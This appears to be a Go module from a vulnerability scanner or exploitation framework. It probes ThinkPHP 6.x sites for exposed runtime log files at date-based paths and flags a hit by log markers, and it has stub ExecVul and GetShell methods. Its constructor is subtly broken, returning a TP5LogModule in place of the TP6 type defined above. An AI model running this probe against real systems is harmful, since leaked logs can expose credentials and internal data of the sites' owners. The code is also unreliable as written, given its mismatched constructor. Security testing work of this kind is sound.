package thinkphp

import (
	"breach/internal/util"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type TP6LogModule struct {
	BaseUrl    string
	feature    string
	checkStr   string
	checkError string
}

func (t *TP6LogModule) CheckVul() *util.Response {
	now := time.Now()
	year := now.Year()
	month := now.Month()
	day := now.Day()
	suffix1 := fmt.Sprintf("%d%02d/%02d.log", year, month, day)

	payloadUrls := []string{
		fmt.Sprintf("%s/runtime/log/%s", t.BaseUrl, suffix1),
		fmt.Sprintf("%s/runtime/log/Home/%s", t.BaseUrl, suffix1),
		fmt.Sprintf("%s/runtime/log/Common/%s", t.BaseUrl, suffix1),
		fmt.Sprintf("%s/runtime/log/Admin/%s", t.BaseUrl, suffix1),
	}
	for _, payloadUrl := range payloadUrls {
		resp, err := http.Get(payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) || strings.Contains(string(bytes), t.checkError) {
			return util.Success(t.feature, payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP6LogModule) ExecVul(cmd string) *util.Response {
	return util.Fail("no vulnerable")
}

func (t *TP6LogModule) GetShell() *util.Response {
	return util.Fail("no vulnerable")
}

func NewTP6LogModule(baseUrl string) *TP5LogModule {
	return &TP5LogModule{
		BaseUrl:    baseUrl,
		feature:    "ThinkPHP 6.x 日志泄露",
		checkStr:   "RunTime",
		checkError: "[ error ]",
	}
}
